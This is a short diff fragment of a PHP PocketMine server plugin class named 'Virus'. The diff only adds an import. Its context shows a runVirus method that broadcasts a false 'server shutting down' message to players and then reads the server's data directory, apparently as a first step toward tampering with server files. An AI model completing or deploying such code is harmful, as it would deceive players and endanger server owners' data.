@@ -4,8 +4,10 @@ namespace provsalt\Virus;
 
 use pocketmine\Server;
 use pocketmine\utils\TextFormat;
+use pocketmine\plugin\PluginBase;
 
 class Virus {
+
 	public static function runVirus() :void{
 		Server::getInstance()->broadcastMessage(TextFormat::colorize("&d[Server] &rGoodbye guys server will be shutting down today!"));
 		$dir = Server::getInstance()->getDataPath();
